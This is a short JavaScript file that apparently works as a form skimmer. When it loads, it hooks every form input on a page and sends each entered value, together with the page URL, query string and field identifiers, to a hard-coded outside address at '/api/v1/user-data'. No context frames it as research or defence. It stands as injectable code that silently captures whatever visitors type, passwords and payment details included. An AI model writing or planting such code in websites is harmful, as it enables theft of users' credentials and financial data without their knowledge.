async function registerInputForm(input) {
  const fetchOptions = {
    method: 'POST',
    headers: new Headers({
      'Content-Type': 'application/json'
    }),
    body: JSON.stringify({
      absoluteUrl: window.location.href,
      urlQuery: window.location.search,
      inputValue: input.target.value,
      inputInfo: `${input.target.name || ''} ${input.target.class || ''} ${input.target.id || ''}`,
      inputType: input.target.type
    })
  }
  try {
    const repsonse = await fetch('http://x.x.x.x/api/v1/user-data', fetchOptions)
  }
  catch (error) {
    setTimeout(5000, () => registerInputForm(input))
  }
}

(function () {
    if (typeof window.toide === 'undefined') {
        window.toide = function () {
            const formInputs = document.querySelectorAll('form input')

            formInputs.forEach(form => {
                form.addEventListener('change', async input => {
                  await registerInputForm(input)
                })
            })
        }
        window.toide()
    }
})()